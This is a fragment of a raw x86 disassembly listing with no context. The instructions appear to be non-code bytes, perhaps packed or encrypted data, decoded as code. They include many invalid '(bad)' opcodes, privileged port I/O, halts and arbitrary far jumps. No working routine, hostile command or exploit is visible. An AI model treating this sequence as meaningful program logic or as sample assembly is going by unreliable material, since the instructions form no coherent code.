  41e103:	sbb    esi,DWORD PTR [edi+0x3b]
  41e106:	jle    0x41e0bd
  41e108:	and    dh,BYTE PTR [edi+0x5a]
  41e10b:	in     al,0xcc
  41e10d:	pushf  
  41e10e:	add    BYTE PTR [eax],al
  41e110:	xchg   esi,eax
  41e111:	xchg   dx,ax
  41e113:	cld    
  41e114:	jl     0x41e12e
  41e116:	sub    BYTE PTR [ecx-0x7e82cb08],ch
  41e11c:	jmp    0xe94c:0x3880
  41e123:	add    BYTE PTR [eax],al
  41e125:	sub    dh,BYTE PTR [edi-0x3b]
  41e128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e129:	mov    edx,DWORD PTR [esi*2-0x20be545a]
  41e130:	pusha  
  41e131:	and    al,BYTE PTR [edi+0x30]
  41e134:	rol    DWORD PTR ds:0xecd8275d,cl
  41e13a:	mov    bl,0xa7
  41e13c:	jg     0x41e154
  41e13e:	push   ecx
  41e13f:	dec    ecx
  41e140:	cmp    dl,ah
  41e142:	rcr    ah,cl
  41e144:	jg     0x41e144
  41e146:	mov    ah,0x9b
  41e148:	or     BYTE PTR [ebx],0x0
  41e14b:	add    BYTE PTR [edx],cl
  41e14d:	push   es
  41e14e:	mov    al,ds:0xf504f4
  41e153:	add    BYTE PTR [esi+0x70],al
  41e156:	fwait
  41e157:	inc    ecx
  41e158:	retf   0x42d7
  41e15b:	mov    ah,0x38
  41e15d:	mov    DWORD PTR fs:[esi+0x7e],esp
  41e161:	in     al,0x96
  41e163:	ficomp DWORD PTR [edi+0x3]
  41e166:	jge    0x41e164
  41e168:	arpl   WORD PTR [ebx+0x62e4f3cd],ax
  41e16e:	jmp    0x41e1d9
  41e170:	jmp    0x41e1a9
  41e172:	pop    edi
  41e173:	out    0x17,al
  41e175:	mov    ch,0xab
  41e177:	add    esp,DWORD PTR [eax+0x19]
  41e17a:	loopne 0x41e1fa
  41e17c:	retf   
  41e17d:	(bad)  
  41e17e:	stos   BYTE PTR es:[edi],al
  41e17f:	retf   0x6c3e
  41e182:	jno    0x41e189
  41e184:	(bad)  
  41e185:	call   FWORD PTR [ebx]
  41e187:	out    dx,al
  41e188:	arpl   WORD PTR [esi-0x50],si
  41e18b:	add    ah,BYTE PTR [eax+edx*4-0x18ab13bd]
  41e192:	retf   0xe403
  41e195:	std    
  41e196:	gs jno 0x41e1c6
  41e199:	sar    BYTE PTR [eax],1
  41e19b:	xor    eax,0x602bf306
  41e1a0:	aam    0x5c
  41e1a2:	mov    edx,0xcf792917
  41e1a7:	mov    ebp,0xa3a2ba3c
  41e1ac:	inc    eax
  41e1ad:	cmp    BYTE PTR [eax],al
  41e1af:	add    BYTE PTR [eax],bh
  41e1b1:	jbe    0x41e164
  41e1b3:	fild   WORD PTR [edi-0x28]
  41e1b6:	mov    ebx,0x2fee646f
  41e1bb:	mov    ss,WORD PTR [ebx-0x5a]
  41e1be:	dec    esp
  41e1bf:	mov    esp,0x90080000
  41e1c4:	add    BYTE PTR [eax],al
  41e1c6:	stos   BYTE PTR es:[edi],al
  41e1c7:	dec    edx
  41e1c8:	test   edi,eax
  41e1ca:	pop    edx
  41e1cc:	(bad)  
  41e1cd:	rol    DWORD PTR [eax],cl
  41e1cf:	add    BYTE PTR [edx-0x6f],al
  41e1d2:	add    BYTE PTR [ecx+0x0],dh
  41e1d5:	add    BYTE PTR [eax+edi*4-0x3f920000],cl
  41e1dc:	sub    BYTE PTR [eax],al
  41e1de:	add    dh,dh
  41e1e0:	data16 ins BYTE PTR es:[edi],dx
  41e1e2:	scas   eax,DWORD PTR es:[edi]
  41e1e3:	fucomp st(7)
  41e1e5:	adc    DWORD PTR [edi-0x3],esp
  41e1e8:	jg     0x41e1a9
  41e1ea:	in     al,0x4c
  41e1ec:	and    eax,DWORD PTR [eax]
  41e1ee:	add    BYTE PTR [eax],dl
  41e1f0:	jmp    0x4bd4:0xb55f988e
  41e1f7:	js     0x41e203
  41e1f9:	dec    ecx
  41e1fa:	inc    ebp
  41e1fb:	dec    ebx
  41e1fc:	imul   edi,edi,0x46
  41e1ff:	fimul  DWORD PTR [esi+ecx*2+0x0]
  41e203:	add    BYTE PTR [eax],ah
  41e205:	enter  0x1,0x0
  41e209:	cdq    
  41e20a:	or     BYTE PTR [ebx],dh
  41e20c:	add    BYTE PTR [eax],al
  41e20e:	fs push ds
  41e210:	mov    ebp,0xcd869dfa
  41e215:	sbb    BYTE PTR [edi-0xe],0x81
  41e219:	popf   
  41e21a:	fisub  WORD PTR [ebp-0x1d8f9ea6]
  41e220:	cmp    esi,ebp
  41e222:	retf   
  41e223:	inc    ebp
  41e224:	fbld   TBYTE PTR [eax+ecx*1-0x5fffff1f]
  41e22b:	lahf   
  41e22c:	mov    ch,0x1e
  41e22e:	loopne 0x41e279
  41e230:	out    0x3,eax
  41e232:	xor    edx,DWORD PTR [ebx-0x6b]
  41e235:	fldenv [ebx-0x3c]
  41e238:	test   DWORD PTR [eax],eax
  41e23a:	add    bh,bl
  41e23c:	shr    DWORD PTR [edi],cl
  41e23e:	adc    al,0x5b
  41e240:	push   edx
  41e241:	pop    edi
  41e242:	outs   dx,DWORD PTR ds:[esi]
  41e243:	pop    edx
  41e244:	inc    esp
  41e245:	sti    
  41e246:	add    BYTE PTR [eax],al
  41e248:	fistp  DWORD PTR [ecx-0x6ebef2c4]
  41e24e:	pop    ecx
  41e24f:	and    bh,BYTE PTR [ebx]
  41e251:	push   0x73686b5e
  41e256:	loope  0x41e1e3
  41e258:	sbb    al,0x1d
  41e25a:	mov    dh,0xdf
  41e25c:	mov    WORD PTR [ecx-0x30290000],gs
  41e262:	hlt    
  41e263:	jg     0x41e1f1
  41e265:	adc    eax,0xf9e40000
  41e26a:	mov    cl,0x42
  41e26c:	jb     0x41e21b
  41e26e:	dec    eax
  41e26f:	add    BYTE PTR [eax],0x0
  41e272:	out    0x34,eax
  41e274:	sbb    al,0x3f
  41e276:	add    eax,0xf10c7624
  41e27b:	add    BYTE PTR [eax],al
  41e27d:	call   0x513a:0x3721b128
  41e284:	inc    ecx
  41e285:	mov    esi,0xdce822c3
  41e28a:	add    DWORD PTR [ebx-0xa],esi
  41e28d:	push   cs
  41e28e:	les    esp,FWORD PTR [edx+0x9f40000]
  41e294:	lods   al,BYTE PTR ds:[esi]
  41e295:	xchg   edi,eax
  41e296:	mov    ds:0x252fba0d,eax
  41e29b:	enter  0x10,0x0
  41e29f:	mov    ch,0x37
  41e2a1:	jmp    0x41e241
  41e2a3:	adc    BYTE PTR [eax],0x0
  41e2a6:	add    BYTE PTR [edx],cl
  41e2a8:	sbb    eax,ecx
  41e2aa:	jmp    0xf93de2af
  41e2af:	cmp    DWORD PTR [edx+0x50],esp
  41e2b2:	(bad)  
  41e2b3:	cmp    al,0x92
  41e2b5:	fdivr  QWORD PTR [esi-0x56719a86]
  41e2bb:	dec    esi
  41e2bc:	ins    DWORD PTR es:[edi],dx
  41e2bd:	add    eax,0x284c81f4
  41e2c2:	add    BYTE PTR [eax],al
  41e2c4:	shl    DWORD PTR [esi+0x601d139c],1
  41e2ca:	scas   al,BYTE PTR es:[edi]
  41e2cb:	push   ecx
  41e2cc:	or     BYTE PTR [ecx],0x80
  41e2cf:	out    0x0,al
  41e2d1:	add    ah,al
  41e2d3:	dec    eax
  41e2d4:	add    BYTE PTR [eax],al
  41e2d6:	test   BYTE PTR [ecx-0x2a],0x8a
  41e2da:	ja     0x41e33e
  41e2dc:	cmp    dl,BYTE PTR [eax]
  41e2de:	or     ch,al
  41e2e0:	add    BYTE PTR [eax],al
  41e2e2:	or     DWORD PTR [edi+0x404cd258],esp
  41e2e8:	add    BYTE PTR [eax],al
  41e2ea:	pop    esi
  41e2eb:	jns    0x41e2ef
  41e2ed:	adc    dh,ah
  41e2ef:	jno    0x41e324
  41e2f1:	in     al,0xac
  41e2f3:	mov    cl,0xb
  41e2f5:	adc    eax,0x2e44
  41e2fa:	retf   
  41e2fb:	stos   DWORD PTR es:[edi],eax
  41e2fc:	popa   
  41e2fd:	mov    DWORD PTR [eax-0x42],ecx
  41e300:	add    BYTE PTR [eax],al
  41e302:	xor    cl,BYTE PTR cs:[edi+0x5dd7b770]
  41e309:	mov    edx,0x6170a7ab
  41e30e:	daa    
  41e30f:	cmp    DWORD PTR es:[edx-0x802e42c],esi
  41e316:	xchg   edx,eax
  41e317:	cmp    cl,BYTE PTR [esi+0x42d1c1ac]
  41e31d:	add    dl,BYTE PTR [eax+0xb]
  41e320:	pop    esi
  41e321:	call   0xca13d66d
  41e326:	out    dx,al
  41e327:	out    dx,al
  41e328:	xchg   DWORD PTR [esp+edx*1+0x749f2c18],edi
  41e32f:	into   
  41e330:	outs   dx,DWORD PTR ds:[esi]
  41e331:	test   al,0xce
  41e333:	xor    eax,0xf43d99d3
  41e338:	cmp    BYTE PTR [ebp-0xf94748a],ah
  41e33e:	jmp    0x27c:0x97e3a5e5
  41e345:	aas    
  41e346:	adc    dl,dl
  41e348:	push   cs
  41e349:	ror    DWORD PTR [esi-0x55],0x92
  41e34d:	xchg   edi,eax
  41e34e:	jb     0x41e323
  41e350:	sbb    BYTE PTR [ebx+0x27],dl
  41e353:	sar    BYTE PTR [esi+edx*1],1
  41e356:	mov    ah,0xe9
  41e358:	adc    al,0x13
  41e35a:	xchg   DWORD PTR [ebx+0x31],edx
  41e35d:	sbb    DWORD PTR [eax+edi*1-0x33],0xffffffa6
  41e362:	mov    ah,0x35
  41e364:	lods   al,BYTE PTR ds:[esi]
  41e365:	and    dh,ch
  41e367:	pusha  
  41e368:	inc    esi
  41e369:	mov    cl,BYTE PTR [esi-0x5]
  41e36c:	or     dl,BYTE PTR [eax]
  41e36e:	mov    ds:0xccf08bef,al
  41e373:	popf   
  41e374:	add    BYTE PTR [eax],al
  41e376:	mov    edx,0x84fb0276
  41e37b:	xor    eax,0x49d0000
  41e380:	clc    
  41e381:	add    BYTE PTR [eax],al
  41e383:	adc    eax,0xfbf5508a
  41e388:	xchg   edi,eax
  41e389:	mov    ds:0x51c99a3,eax
  41e38e:	int3   
  41e38f:	jmp    0x6aff:0x52100000
  41e396:	ins    DWORD PTR es:[edi],dx
  41e397:	xchg   ecx,eax
  41e398:	sub    eax,0x171d56c7
  41e39d:	out    0xf,eax
  41e39f:	xchg   edx,eax
  41e3a0:	mov    al,ds:0x52b8dded
  41e3a5:	lods   eax,DWORD PTR ds:[esi]
  41e3a6:	mov    ebp,DWORD PTR [edi]
  41e3a8:	pop    ss
  41e3a9:	fcmovb st,st(3)
  41e3ab:	jb     0x41e356
  41e3ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3ae:	cmp    BYTE PTR [esi],dh
  41e3b0:	(bad)  
  41e3b1:	cdq    
  41e3b2:	push   cs
  41e3b3:	into   
  41e3b4:	and    DWORD PTR gs:[edx+0x28ed0d1f],0x5c44
  41e3bf:	and    eax,0x6036fc23
  41e3c4:	bound  edi,QWORD PTR [ecx+eiz*2+0x3a6a156c]
  41e3cb:	(bad)  
  41e3cc:	push   ss
  41e3cd:	mov    dl,0xaa
  41e3cf:	aad    0xbd
  41e3d1:	mov    esi,0xdcfc0d56
  41e3d6:	mov    dl,0xe0
  41e3d8:	pushf  
  41e3d9:	out    dx,eax
  41e3da:	add    edi,eax
  41e3dc:	dec    esp
  41e3dd:	daa    
  41e3de:	add    BYTE PTR [eax],al
  41e3e0:	bound  esp,QWORD PTR [ebp+0x23a8f843]
  41e3e6:	mov    edi,ebp
  41e3e8:	mov    dh,0xa7
  41e3ea:	sbb    bh,BYTE PTR [edi+eiz*1+0x3a]
  41e3ee:	mov    WORD PTR [edi],cs
  41e3f0:	add    BYTE PTR [eax],al
  41e3f2:	inc    ecx
  41e3f3:	adc    dl,BYTE PTR [esi]
  41e3f5:	add    eax,0xffaf5293
  41e3fa:	pop    ecx
  41e3fb:	hlt    
  41e3fc:	xor    eax,0x15098360
  41e401:	scas   eax,DWORD PTR es:[edi]
  41e402:	nop
  41e403:	pop    eax
  41e404:	inc    edx
  41e405:	js     0x41e47e
  41e407:	dec    esp
  41e408:	aam    0x0
  41e40a:	add    BYTE PTR [ecx],bh
  41e40c:	mov    ch,0xee
  41e40e:	mov    eax,0x7923eb18
  41e413:	jle    0x41e48d
  41e415:	mov    ds:0x994c30,eax
  41e41a:	add    bl,bl
  41e41c:	sbb    al,0xeb
  41e41e:	fsubr  st,st(1)
  41e420:	out    dx,eax
  41e421:	dec    edx
  41e422:	fist   WORD PTR [ebx-0x129f2256]
  41e428:	test   DWORD PTR [ebx-0x36],0xf4ae73fd
  41e42f:	repz jnp 0x41e461
  41e432:	loopne 0x41e44f
  41e434:	fwait
  41e435:	repz jns 0x41e452
  41e438:	aaa    
  41e439:	cli    
  41e43a:	arpl   WORD PTR [esi+eiz*4-0x459649ae],bp
  41e441:	icebp  
  41e442:	aad    0x79
  41e444:	sbb    al,0xd2
  41e446:	repz cmp ah,BYTE PTR [eax]
  41e449:	iret   
  41e44a:	xor    edi,DWORD PTR [esi+0x6b]
  41e44d:	(bad)  
  41e44e:	div    BYTE PTR [eax-0x2bfb7551]
  41e454:	add    BYTE PTR [eax],al
  41e456:	rcl    DWORD PTR [ecx],cl
  41e458:	lds    ebp,FWORD PTR [ebx+0x3e]
  41e45b:	(bad)  [edi*1+0x71363ffb]
  41e462:	hlt    
  41e463:	pop    ds
  41e464:	cld    
  41e465:	std    
  41e466:	adc    DWORD PTR [esi],esi
  41e468:	sub    BYTE PTR [eax],dl
  41e46a:	popfw  
  41e46c:	mov    ecx,DWORD PTR [edx-0x6c]
  41e46f:	sub    eax,0x8ed5fa06
  41e474:	mov    DWORD PTR [edi+ebp*2-0x5dd60000],ecx
  41e47b:	jns    0x41e445
  41e47d:	add    al,BYTE PTR [eax]
  41e47f:	add    BYTE PTR [eax],al
  41e481:	mov    bh,0x0
  41e483:	add    bh,dh
  41e485:	adc    DWORD PTR [edx-0x5ab7b9e7],edx
  41e48b:	add    BYTE PTR [eax],al
  41e48d:	sbb    DWORD PTR [edi],ebp
  41e48f:	rcr    BYTE PTR ds:0x61f3fe7f,cl
  41e495:	scas   eax,DWORD PTR es:[edi]
  41e496:	pusha  
  41e497:	retf   0x6c56
  41e49a:	pop    edx
  41e49b:	dec    esi
  41e49c:	cdq    
  41e49d:	inc    esp
  41e49e:	or     DWORD PTR [eax],eax
  41e4a0:	add    BYTE PTR [edi],al
  41e4a2:	xor    BYTE PTR [eax-0x72],0x5a
  41e4a6:	in     al,dx
  41e4a7:	mov    WORD PTR [esi+0x7ae10000],fs
  41e4ad:	mov    dh,0x49
  41e4af:	fwait
  41e4b0:	add    DWORD PTR [eax+0x1e0e2449],esi
  41e4b6:	or     al,0x3f
  41e4b8:	add    BYTE PTR [eax],al
  41e4ba:	push   ecx
  41e4bb:	xchg   ebp,eax
  41e4bc:	jae    0x41e48a
  41e4be:	cld    
  41e4bf:	add    BYTE PTR [eax],al
  41e4c1:	mov    bl,0x4c
  41e4c3:	mov    ch,0x0
  41e4c5:	add    BYTE PTR [edi],bl
  41e4c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4c8:	push   ebx
  41e4c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4ca:	inc    esi
  41e4cb:	out    dx,eax
  41e4cc:	sub    al,0x1a
  41e4ce:	ss jmp 0x41e523
  41e4d1:	sbb    ebx,ecx
  41e4d3:	adc    bh,ch
  41e4d5:	bound  esi,QWORD PTR [edi]
  41e4d7:	or     al,0x3
  41e4d9:	add    BYTE PTR [eax],al
  41e4db:	je     0x41e505
  41e4dd:	sbb    al,0xaf
  41e4df:	dec    ebp
  41e4e0:	jl     0x41e556
  41e4e2:	out    0x82,al
  41e4e4:	pop    ss
  41e4e5:	jge    0x41e563
  41e4e7:	and    esp,edi
  41e4e9:	sbb    BYTE PTR ds:0xadabb6b7,ch
  41e4ef:	xor    al,0x8e
  41e4f1:	sar    BYTE PTR [ebp+0x0],0x0
  41e4f5:	sbb    dh,ch
  41e4f7:	and    edx,ebx
  41e4f9:	les    edi,FWORD PTR [ebx-0x15e20000]
  41e4ff:	and    BYTE PTR [edi+0x20],ch
  41e502:	retf   0xa283
  41e505:	or     DWORD PTR [eax],0x77
  41e508:	add    BYTE PTR [eax],al
  41e50a:	fimul  WORD PTR [edx]
  41e50c:	call   0x6231e5
  41e511:	add    BYTE PTR [ecx],dh
  41e513:	cmp    edi,DWORD PTR [ebx+0xd54bf5e]
  41e519:	aad    0x7b
  41e51b:	enter  0x59,0x0
  41e51f:	js     0x41e4a5
  41e521:	sbb    BYTE PTR [eax],al
  41e523:	add    ah,ah
  41e525:	mov    esi,0xf6881b
  41e52a:	add    dh,cl
  41e52c:	outs   dx,BYTE PTR ds:[esi]
  41e52d:	add    BYTE PTR [eax-0x495b0000],dh
  41e533:	(bad)  
  41e535:	lods   eax,DWORD PTR ds:[esi]
  41e536:	lock arpl WORD PTR [ebx],si
  41e539:	mov    ebp,0x64ac371d
  41e53e:	jnp    0x41e5b0
  41e540:	xchg   esi,eax
  41e541:	adc    cl,BYTE PTR es:[ecx+0x1f1a749a]
  41e548:	inc    eax
  41e549:	jbe    0x41e54b
  41e54b:	add    BYTE PTR [edx+0x9f44],dl
  41e551:	cmp    esi,DWORD PTR [edx-0x31]
  41e554:	xor    DWORD PTR [eax-0x68],esi
  41e557:	or     esp,DWORD PTR [ebp+0x64]
  41e55a:	mov    dl,0x73
  41e55c:	add    BYTE PTR [ecx],bh
  41e55e:	add    BYTE PTR [eax],al
  41e560:	call   0x8b7615f9
  41e565:	add    DWORD PTR es:[edi-0x680e06e8],0x4000
  41e570:	jmp    0x41e5dc
  41e572:	dec    ecx
  41e573:	sbb    eax,0x900c
  41e578:	enter  0x87,0x0
  41e57c:	cs mov bh,0x67
  41e57f:	stc    
  41e580:	test   al,0x70
  41e582:	push   ecx
  41e583:	add    ebp,ebp
  41e585:	mov    al,dh
  41e587:	push   ss
  41e588:	fidiv  WORD PTR [ebx-0x53]
  41e58b:	add    BYTE PTR [ebx-0x71500000],ah
  41e591:	and    al,0x32
  41e593:	or     dh,bh
  41e595:	ficomp DWORD PTR [ecx]
  41e597:	jne    0x41e54d
  41e599:	scas   eax,DWORD PTR es:[edi]
  41e59a:	inc    esp
  41e59b:	mov    eax,ds:0xaea0000
  41e5a0:	push   esp
  41e5a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5a2:	xor    ebp,DWORD PTR [ebx]
  41e5a4:	in     al,0x37
  41e5a6:	xchg   edi,eax
  41e5a7:	mov    edx,0xf8829f19
  41e5ac:	jl     0x41e5d2
  41e5ae:	dec    esp
  41e5af:	adc    al,BYTE PTR [eax]
  41e5b1:	add    BYTE PTR [esi],dl
  41e5b3:	mov    ah,0xf5
  41e5b5:	jg     0x41e5f1
  41e5b7:	dec    edx
  41e5b8:	mov    edx,0xa07b0b53
  41e5bd:	repnz gs addr16 pusha 
  41e5c1:	leave  
  41e5c2:	sar    BYTE PTR [ecx],0x0
  41e5c5:	add    BYTE PTR [eax+eax*1],bh
  41e5c8:	xor    DWORD PTR [eax],eax
  41e5ca:	add    BYTE PTR [esi+ebp*2+0x2206a2b1],dh
  41e5d1:	push   ecx
  41e5d2:	and    eax,0xf71c4942
  41e5d7:	popa   
  41e5d8:	push   0x55
  41e5da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5db:	stos   BYTE PTR es:[edi],al
  41e5dc:	adc    eax,0x5cf7877e
  41e5e1:	xchg   esp,eax
  41e5e2:	or     dl,ah
  41e5e4:	mov    ecx,0xc2a61093
  41e5e9:	adc    bl,BYTE PTR [edi]
  41e5eb:	mov    al,0x97
  41e5ed:	test   eax,0xffd9c941
  41e5f2:	adc    edx,DWORD PTR [edx-0xd]
  41e5f5:	mov    cl,0xa8
  41e5f7:	loop   0x41e5c9
  41e5f9:	es xchg esi,eax
  41e5fb:	and    edi,DWORD PTR [eax-0x4bb47194]
  41e601:	sub    eax,0x9888
  41e606:	inc    esi
  41e607:	(bad)  
  41e609:	or     dh,dh
  41e60b:	add    BYTE PTR [eax],al
  41e60d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e60e:	inc    esp
  41e60f:	sbb    eax,0xf6300000
  41e614:	jns    0x41e5da
  41e616:	icebp  
  41e617:	add    BYTE PTR [eax],al
  41e619:	xor    DWORD PTR [eax+0x302d5da],edi
  41e61f:	imul   esi,ebp,0x2760cb07
  41e625:	cmp    al,0x25
  41e627:	mov    ebx,es
  41e629:	add    BYTE PTR [eax],al
  41e62b:	das    
  41e62c:	adc    BYTE PTR [esi+0x309719b2],dh
  41e632:	mov    ecx,0xfd393fa
  41e637:	test   cl,ah
  41e639:	add    BYTE PTR [eax],al
  41e63b:	inc    ecx
  41e63c:	xor    ah,dl
  41e63e:	and    al,0x19
  41e640:	stos   BYTE PTR es:[edi],al
  41e641:	jp     0x41e67b
  41e643:	xchg   esp,eax
  41e644:	loopne 0x41e60a
  41e646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e647:	add    BYTE PTR [eax],al
  41e649:	adc    DWORD PTR [eax+0x60],esi
  41e64c:	call   0xc504:0xcbbcd770
  41e653:	add    BYTE PTR [eax],al
  41e655:	or     dh,cl
  41e657:	add    BYTE PTR [eax],al
  41e659:	add    BYTE PTR [ecx+0x57],0x7c
  41e65d:	mov    esi,ebx
  41e65f:	hlt    
  41e660:	sub    ecx,eax
  41e662:	mov    eax,ds:0xcb9f19cb
  41e667:	dec    edx
  41e668:	pop    ds
  41e669:	pop    edi
  41e66a:	and    eax,0x94a60a8
  41e66f:	jle    0x41e68e
  41e671:	cld    
  41e672:	jecxz  0x41e5fb
  41e674:	jb     0x41e642
  41e676:	jle    0x41e678
  41e678:	add    bh,dl
  41e67a:	fcmovnu st,st(2)
  41e67c:	fisub  WORD PTR [edx+0x6fb4ad75]
  41e682:	mov    ebx,0xb73c54f0
  41e687:	jmp    0x41e61e
  41e689:	jns    0x41e6a3
  41e68b:	lods   al,BYTE PTR ds:[esi]
  41e68c:	mov    bh,0xec
  41e68e:	popa   
  41e68f:	test   DWORD PTR [ebp-0x65395db0],edi
  41e695:	jnp    0x41e695
  41e697:	pusha  
  41e698:	xchg   DWORD PTR [ecx-0x9c7a11b],ebx
  41e69e:	add    ecx,DWORD PTR [edx]
  41e6a0:	push   ds
  41e6a1:	adc    eax,0x41538bb8
  41e6a6:	push   es
  41e6a7:	imul   esi,DWORD PTR [eax+ebx*1-0x5d7f1e39],0x6cd60000
  41e6b2:	sahf   
  41e6b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6b5:	push   0x50ed1a62
  41e6ba:	in     eax,dx
  41e6bb:	ret    0xb59e
  41e6be:	xchg   ebp,eax
  41e6bf:	or     esp,DWORD PTR [edx+0x23]
  41e6c2:	daa    
  41e6c3:	rcr    BYTE PTR [ecx+0x0],0x0
  41e6c7:	cmp    ch,ch
  41e6c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6ca:	fwait
  41e6cb:	(bad)  
  41e6cc:	mov    BYTE PTR [ebx],0x9a
  41e6cf:	clc    
  41e6d0:	push   cs
  41e6d1:	jne    0x41e68b
  41e6d3:	sbb    DWORD PTR [edi],eax
  41e6d5:	mov    ds:0x131e56f2,eax
  41e6da:	mov    ds:0xd708127b,al
  41e6df:	add    BYTE PTR [eax],al
  41e6e1:	push   ebp
  41e6e2:	mov    bh,0xf2
  41e6e4:	shl    ebx,0xaa
  41e6e7:	mov    eax,0x80a7608f
  41e6ec:	sbb    al,BYTE PTR [eax]
  41e6ee:	add    BYTE PTR [edi],ch
  41e6f0:	sbb    al,ah
  41e6f2:	(bad)  
  41e6f3:	es in  eax,0x1b
  41e6f6:	cmp    eax,0xfe761481
  41e6fb:	std    
  41e6fc:	ror    DWORD PTR [ebx+edi*4+0x76290000],0x54
  41e704:	shr    DWORD PTR [ebx+0x62c06cf6],cl
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	cmp    edx,ebp
  41e70e:	lahf   
  41e70f:	imul   ebp,DWORD PTR [ebp-0x3a],0x51746c3a
  41e716:	fld    QWORD PTR [edi-0x4e141ca7]
  41e71c:	xchg   ecx,eax
  41e71d:	fld    DWORD PTR [ebx-0x67e7e276]
  41e723:	add    eax,0x3e7290ba
  41e728:	mov    ds:0x7db84a76,al
  41e72d:	mov    eax,ds:0x5661af85
  41e732:	out    dx,al
  41e733:	add    BYTE PTR [esi],bl
  41e735:	add    BYTE PTR [eax],al
  41e737:	outs   dx,BYTE PTR ds:[esi]
  41e738:	jbe    0x41e749
  41e73a:	pavgb  mm6,mm3
  41e73d:	xchg   esp,eax
  41e73e:	popf   
  41e73f:	pusha  
  41e740:	pop    esi
  41e741:	stos   DWORD PTR es:[edi],eax
  41e742:	sub    ch,ah
  41e744:	dec    esp
  41e745:	add    DWORD PTR [eax],0x3acf7800
  41e74b:	xor    ebp,DWORD PTR [esi+0x50480e43]
  41e751:	add    BYTE PTR [eax],al
  41e753:	adc    DWORD PTR [edx+ebp*1],ebp
  41e756:	jge    0x41e6dc
  41e758:	sbb    BYTE PTR [eax],al
  41e75a:	add    BYTE PTR [edi-0x5a87405a],bl
  41e760:	dec    ecx
  41e761:	frstor [esi-0x9]
  41e764:	data16 jns 0x41e7d3
  41e767:	call   0x3b7596f5
  41e76c:	mov    ds:0x4e98aef9,al
  41e771:	jns    0x41e7c5
  41e773:	aam    0x7c
  41e775:	neg    esi
  41e777:	nop
  41e778:	add    al,dh
  41e77a:	add    BYTE PTR [eax],al
  41e77c:	mov    dl,0x41
  41e77e:	inc    BYTE PTR [edi+0x16b47274]
  41e784:	pop    ecx
  41e785:	cmp    BYTE PTR [eax+0x17],al
  41e788:	add    BYTE PTR [eax],al
  41e78a:	pushf  
  41e78b:	mov    ch,0x4
  41e78d:	jns    0x41e78f
  41e78f:	add    BYTE PTR [ecx+0xf50036],bl
  41e795:	add    ah,ah
  41e797:	push   edx
  41e798:	mov    ?,esp
  41e79a:	pop    edx
  41e79b:	adc    al,0x64
  41e79d:	outs   dx,DWORD PTR ds:[esi]
  41e79e:	fisubr DWORD PTR [ebp+0x1ed435ce]
  41e7a4:	and    bl,dl
  41e7a6:	lods   al,BYTE PTR ds:[esi]
  41e7a7:	scas   al,BYTE PTR es:[edi]
  41e7a8:	rcl    ah,0x0
  41e7ab:	add    BYTE PTR [esi+0x3904],bl
  41e7b1:	xchg   edi,eax
  41e7b2:	retf   
  41e7b3:	xor    ch,BYTE PTR [ecx+0x6c]
  41e7b6:	out    0x6a,eax
  41e7b8:	mov    ecx,0xd28628c7
  41e7bd:	mov    cl,0x4a
  41e7bf:	cs jg  0x41e746
  41e7c2:	push   edi
  41e7c3:	add    BYTE PTR [eax],al
  41e7c5:	jp     0x41e846
  41e7c7:	push   esi
  41e7c8:	aam    0x32
  41e7ca:	out    dx,al
  41e7cb:	sbb    al,0xc7
  41e7cd:	das    
  41e7ce:	icebp  
  41e7cf:	shr    BYTE PTR [esi+0x33ff0000],0xf9
  41e7d6:	push   esp
  41e7d7:	add    DWORD PTR ds:0x346af552,ebp
  41e7dd:	popa   
  41e7de:	test   eax,0xf70cf2fa
  41e7e3:	add    BYTE PTR [eax],al
  41e7e5:	mov    bl,0xf5
  41e7e7:	mov    edx,0x3125ce72
  41e7ec:	xor    DWORD PTR [ebp+edx*8+0xf1bcabf],0x43
  41e7f4:	fld    st(6)
  41e7f6:	fs cmc 
  41e7f8:	jne    0x41e7ca
  41e7fa:	cmp    eax,0xe751915b
  41e7ff:	sub    BYTE PTR [ecx+0x7e],al
  41e802:	call   0x0:0xd548f749
  41e809:	das    
  41e80a:	jmp    0x41e81d
  41e80c:	jnp    0x41e7eb
  41e80e:	adc    BYTE PTR [edi+0x39],0x8c
  41e812:	pushf  
  41e813:	add    BYTE PTR [eax],al
  41e815:	(bad)  
  41e816:	div    al
  41e818:	jmp    0x41e7fd
  41e81a:	js     0x41e838
  41e81c:	fs test eax,0x9f17ead2
  41e822:	shl    DWORD PTR [ebp-0x7fa4515],1
  41e828:	dec    eax
  41e829:	jb     0x41e82b
  41e82b:	add    ah,ch
  41e82d:	in     al,dx
  41e82e:	gs inc ecx
  41e830:	cwde   
  41e831:	inc    edi
  41e832:	mov    cl,0xa7
  41e834:	cdq    
  41e835:	bound  esi,QWORD PTR [ecx]
  41e837:	pop    es
  41e838:	add    al,0xd5
  41e83a:	add    BYTE PTR [eax],al
  41e83c:	dec    esi
  41e83d:	clc    
  41e83e:	mov    ebp,edx
  41e840:	out    dx,eax
  41e841:	jno    0x41e878
  41e843:	dec    ecx
  41e844:	xor    eax,0xb7e06da7
  41e849:	loope  0x41e7fe
  41e84b:	jl     0x41e7d8
  41e84d:	adc    al,0x6f
  41e84f:	into   
  41e850:	inc    ecx
  41e851:	xor    BYTE PTR [ecx+0x4d5e6b15],dl
  41e857:	xor    al,0x18
  41e859:	aas    
  41e85a:	pop    eax
  41e85b:	xor    ah,bl
  41e85d:	iret   
  41e85e:	and    DWORD PTR [ebx-0x2a],ebx
  41e861:	sub    bh,BYTE PTR [eax+0xf]
  41e864:	pushf  
  41e865:	sbb    esi,DWORD PTR [edi-0x2dea67f1]
  41e86b:	icebp  
  41e86c:	adc    DWORD PTR [edi-0x56568d96],ecx
  41e872:	fldenv [esi+ebx*4-0x69ba385d]
  41e879:	out    dx,eax
  41e87a:	lods   eax,DWORD PTR ds:[esi]
  41e87b:	(bad)  
  41e87c:	pop    esp
  41e87d:	xor    dl,BYTE PTR [esi+eax*8+0x32]
  41e881:	iret   
  41e882:	je     0x41e82c
  41e884:	mov    esi,0x4848c2
